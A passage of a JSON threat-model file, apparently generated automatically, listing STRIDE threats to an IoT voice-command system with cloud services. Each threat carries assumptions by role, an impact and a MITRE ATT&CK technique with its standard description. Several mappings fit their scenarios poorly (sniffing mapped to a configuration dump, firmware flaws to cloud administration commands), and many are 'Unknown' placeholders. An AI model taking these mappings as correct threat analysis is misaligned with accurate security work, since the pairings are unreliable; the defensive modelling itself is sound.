                    "Assumption": "Network traffic between server and client is unencrypted.",
                    "Role": "Network Engineer",
                    "Condition": "Communications are not secured via encryption."
                },
                {
                    "Assumption": "No end-to-end integrity checks on messages.",
                    "Role": "Application Developer",
                    "Condition": "Lack of mechanisms to validate message integrity."
                },
                {
                    "Assumption": "The system lacks intrusion detection capabilities.",
                    "Role": "Security Analyst",
                    "Condition": "Insufficient monitoring for tampered communications."
                }
            ],
            "Potential Impact": "Incorrect command execution, possible data breaches or system dysfunction.",
            "MITRE ATT&CK Keywords": [
                "response tampering",
                "network interception",
                "message modification",
                "system disruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Admin actions are executed without proper logging, enabling repudiation by malicious insiders.",
            "Assumptions": [
                {
                    "Assumption": "The system lacks comprehensive logging mechanisms.",
                    "Role": "System Administrator",
                    "Condition": "Logging is incomplete or inadequately maintained."
                },
                {
                    "Assumption": "Logs are not tamper-proof.",
                    "Role": "Security Analyst",
                    "Condition": "Logs can be modified or deleted by insiders."
                },
                {
                    "Assumption": "No audit trails for administrative actions are in place.",
                    "Role": "Compliance Officer",
                    "Condition": "Insufficient audit controls and policies."
                }
            ],
            "Potential Impact": "Inability to verify administrative actions, potential for insider threats.",
            "MITRE ATT&CK Keywords": [
                "administrative actions",
                "logging failures",
                "audit trail deficiencies",
                "insider threats"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users deny issuing certain voice commands due to lack of proper request logging.",
            "Assumptions": [
                {
                    "Assumption": "Voice commands are not logged diligently.",
                    "Role": "Application Developer",
                    "Condition": "Insufficient voice command logging mechanisms."
                },
                {
                    "Assumption": "No mechanisms to trace commands to users.",
                    "Role": "Security Architect",
                    "Condition": "Lack of user identification linking to voice commands."
                },
                {
                    "Assumption": "Logs can be edited or deleted.",
                    "Role": "System Administrator",
                    "Condition": "Inability to protect audit logs from tampering."
                }
            ],
            "Potential Impact": "Denial of responsibility for actions taken, hindrance in incident investigations.",
            "MITRE ATT&CK Keywords": [
                "voice command logging",
                "user repudiation",
                "audit capabilities",
                "incident investigation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Malicious actor alters logs to remove traces of their actions in the IoT system.",
            "Assumptions": [
                {
                    "Assumption": "Logs have insufficient access controls.",
                    "Role": "Security Officer",
                    "Condition": "Inadequate restrictions on who can access and alter logs."
                },
                {
                    "Assumption": "No redundancy or backup for logs.",
                    "Role": "IT Management",
                    "Condition": "Logs are not redundantly stored or regularly backed up."
                },
                {
                    "Assumption": "Lack of real-time monitoring.",
                    "Role": "Security Analyst",
                    "Condition": "Absence of monitoring system to detect log alterations."
                }
            ],
            "Potential Impact": "Loss of forensic evidence, difficulty attributing unauthorized actions.",
            "MITRE ATT&CK Keywords": [
                "log manipulation",
                "audit trail",
                "forensic interference",
                "system alterations"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker captures voice commands during transmission to the server-side application.",
            "Assumptions": [
                {
                    "Assumption": "Voice command transmissions are unencrypted.",
                    "Role": "Network Engineer",
                    "Condition": "Data is sent in clear text over the network."
                },
                {
                    "Assumption": "Network traffic is not monitored for eavesdropping.",
                    "Role": "Security Analyst",
                    "Condition": "No monitoring mechanisms to detect interception."
                },
                {
                    "Assumption": "Lack of security training.",
                    "Role": "Organizational Management",
                    "Condition": "Users are unaware of secure transmission protocols."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive commands and user information.",
            "MITRE ATT&CK Keywords": [
                "eavesdropping",
                "data interception",
                "voice command capture",
                "network vulnerability"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive user data stored on cloud services is accessed by unauthorized entities.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage lacks sufficient access controls.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Insufficient restriction policies on data access."
                },
                {
                    "Assumption": "Data stored is not encrypted.",
                    "Role": "Cloud Security Engineer",
                    "Condition": "Data is stored in plaintext without encryption."
                },
                {
                    "Assumption": "Cloud services do not audit access logs.",
                    "Role": "Compliance Officer",
                    "Condition": "No regular auditing of access logs for anomalies."
                }
            ],
            "Potential Impact": "Exposure of sensitive user information, leading to data breaches.",
            "MITRE ATT&CK Keywords": [
                "cloud services",
                "data leakage",
                "unauthorized access",
                "sensitive information"
            ],
            "mitre_technique": {
                "name": "Cloud Instance Metadata API",
                "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n",
                "id": "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3",
                "technique_id": "T1552.005"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker uses sniffing tools to capture data exchanged between the IoT controller and devices.",
            "Assumptions": [
                {
                    "Assumption": "Data exchange between IoT controller and devices is unencrypted.",
                    "Role": "IoT Developer",
                    "Condition": "Clear text communication between controller and devices."
                },
                {
                    "Assumption": "Network lacks segmentation.",
                    "Role": "Network Engineer",
                    "Condition": "Flat network without segmented zones."
                },
                {
                    "Assumption": "No regular network traffic monitoring.",
                    "Role": "Security Analyst",
                    "Condition": "Lack of tools to monitor for suspicious activity."
                }
            ],
            "Potential Impact": "Leakage of sensitive operational data, potential future exploitations.",
            "MITRE ATT&CK Keywords": [
                "data sniffing",
                "network traffic capture",
                "IoT communication",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Network Device Configuration Dump",
                "description": "Adversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.\n\nAdversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files.(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks) These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis. ",
                "id": "attack-pattern--52759bf1-fe12-4052-ace6-c5b0cf7dd7fd",
                "technique_id": "T1602.002"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker overwhelms the server-side application with a flood of malformed requests.",
            "Assumptions": [
                {
                    "Assumption": "Server lacks rate-limiting mechanisms.",
                    "Role": "Server Administrator",
                    "Condition": "No rate-limiting controls in place for request handling."
                },
                {
                    "Assumption": "Network can be saturated with high traffic.",
                    "Role": "Network Engineer",
                    "Condition": "Network infrastructure unable to handle high traffic volume."
                },
                {
                    "Assumption": "Server doesn't utilize load balancing.",
                    "Role": "Infrastructure Architect",
                    "Condition": "Absence of load balancing in server configuration."
                }
            ],
            "Potential Impact": "Resource exhaustion, preventing legitimate users from accessing the application.",
            "MITRE ATT&CK Keywords": [
                "DoS attack",
                "malformed requests",
                "network flooding",
                "server overload"
            ],
            "mitre_technique": {
                "name": "Network Denial of Service",
                "description": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).",
                "id": "attack-pattern--d74c4a7e-ffbf-432f-9365-7ebf1f787cab",
                "technique_id": "T1498"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker uses botnets to keep the IoT controller in a busy state, preventing legitimate commands.",
            "Assumptions": [
                {
                    "Assumption": "IoT Controller lacks request throttling.",
                    "Role": "IoT Developer",
                    "Condition": "No mechanisms to limit the rate of requests."
                },
                {
                    "Assumption": "Network allows uncontrolled traffic from external sources.",
                    "Role": "Network Security Engineer",
                    "Condition": "No filtering of incoming traffic."
                },
                {
                    "Assumption": "Bots can easily join the network.",
                    "Role": "IT Security",
                    "Condition": "Insufficient verification for devices joining the network."
                }
            ],
            "Potential Impact": "Inability to execute legitimate IoT commands, service interruptions.",
            "MITRE ATT&CK Keywords": [
                "botnet attack",
                "IoT controller",
                "service disruption",
                "command blocking"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Distributed Denial of Service (DDoS) attack initiated against cloud services, affecting data processing and availability.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services lack DDoS mitigation strategies.",
                    "Role": "Cloud Provider",
                    "Condition": "No DDoS protection measures in place."
                },
                {
                    "Assumption": "Cloud-based applications are not load-balanced.",
                    "Role": "Cloud Architect",
                    "Condition": "Single-point of failure in cloud services."
                },
                {
                    "Assumption": "High traffic can disrupt service continuity.",
                    "Role": "Network Operator",
                    "Condition": "Network setup unable to handle excessive traffic."
                }
            ],
            "Potential Impact": "Service unavailability, degradation in performance affecting user experience.",
            "MITRE ATT&CK Keywords": [
                "DDoS attack",
                "cloud services",
                "resource exhaustion",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Endpoint Denial of Service",
                "description": "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.(Citation: ArsTechnica Great Firewall of China)\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](https://attack.mitre.org/techniques/T1498).\n",
                "id": "attack-pattern--c675646d-e204-4aa8-978d-e3d6d65885c4",
                "technique_id": "T1499"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the client-side application to gain higher privileges.",
            "Assumptions": [
                {
                    "Assumption": "Client-side application contains exploitable vulnerabilities.",
                    "Role": "Application Developer",
                    "Condition": "Outdated or vulnerable code in the application."
                },
                {
                    "Assumption": "Lack of input validation in the client application.",
                    "Role": "Software Engineer",
                    "Condition": "Inputs are not adequately sanitized or validated."
                },
                {
                    "Assumption": "Insufficient user role management.",
                    "Role": "Application Architect",
                    "Condition": "Absence of strict role-based access controls."
                }
            ],
            "Potential Impact": "Unauthorized access to system functions and sensitive data.",
            "MITRE ATT&CK Keywords": [
                "client-side vulnerability",
                "privilege escalation",
                "input validation failure",
                "role management"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains administrative access to the IoT controller by exploiting firmware flaws.",
            "Assumptions": [
                {
                    "Assumption": "IoT devices run outdated firmware with known vulnerabilities.",
                    "Role": "Device Manufacturer",
                    "Condition": "Old firmware with publicly available exploits."
                },
                {
                    "Assumption": "Lack of firmware integrity checks.",
                    "Role": "Firmware Developer",
                    "Condition": "No mechanisms to ensure firmware hasn't been tampered with."
                },
                {
                    "Assumption": "Weak authentication mechanisms in the IoT controller.",
                    "Role": "IoT Developer",
                    "Condition": "Presence of weak or default authentication credentials."
                }
            ],
            "Potential Impact": "Complete control over IoT devices and potential exposure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "firmware vulnerabilities",
                "administrative access",
                "IoT controller",
                "authentication flaws"
            ],
            "mitre_technique": {
                "name": "Cloud Administration Command",
                "description": "Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. (Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command)\n\nIf an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment\u2019s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021)",
                "id": "attack-pattern--d94b3ae9-8059-4989-8e9f-ea0f601f80a7",
                "technique_id": "T1651"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of unpatched cloud service vulnerabilities to gain elevated privileges across the application.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services are using outdated software with vulnerabilities.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Unpatched software or services in the cloud environment."
                },
                {
                    "Assumption": "Lack of segmentation within cloud services.",
                    "Role": "Cloud Architect",
                    "Condition": "Absence of network or service segmentation."
                },
                {
                    "Assumption": "Weak access controls on cloud services.",
                    "Role": "Cloud Security Engineer",
                    "Condition": "Inadequate access control policies."
                }
            ],
            "Potential Impact": "Unauthorized control and access to sensitive data and services.",
            "MITRE ATT&CK Keywords": [
                "cloud vulnerabilities",
                "privilege escalation",
                "unauthorized access",
                "service exploitation"
            ],
            "mitre_technique": {
                "name": "Additional Cloud Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)",
                "id": "attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3",
                "technique_id": "T1098.003"
            }
        }
    ]
}
]